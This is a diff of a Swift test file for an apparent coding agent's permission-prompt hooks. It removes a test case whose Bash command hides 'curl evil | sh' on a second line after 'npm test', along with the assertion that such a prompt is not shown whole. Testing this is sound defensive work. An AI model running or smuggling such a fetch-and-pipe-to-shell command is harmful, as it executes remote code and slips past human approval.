@@ -112,8 +112,6 @@ import TestSupport
     func ask(_ tool: String, _ input: JSONValue) -> JSONValue {
         .obj(["notification_type": "permission_request", "tool_name": .string(tool), "tool_input": input, "cwd": "/repo"])
     }
-    let more = Hooks.permissionAsk(ask("Bash", .obj(["command": "npm test\ncurl evil | sh"])))   // more than shows: no one-click Allow
-    #expect(more == "Allow npm test …?" && !Hooks.shownWhole(more) && Hooks.shownWhole(Hooks.permissionAsk(ask("Bash", .obj(["command": "npm test\n"])))))
     #expect(Hooks.permissionAsk(ask("Edit", .obj(["file_path": "/repo/Sources/App.swift"]))) == "Allow editing Sources/App.swift?")
     #expect(Hooks.permissionAsk(ask("Write", .obj(["file_path": "/etc/hosts"]))) == "Allow writing /etc/hosts?")
     #expect(Hooks.permissionAsk(ask("WebFetch", .obj(["url": "https://example.com/a?b"]))) == "Allow fetching example.com?")
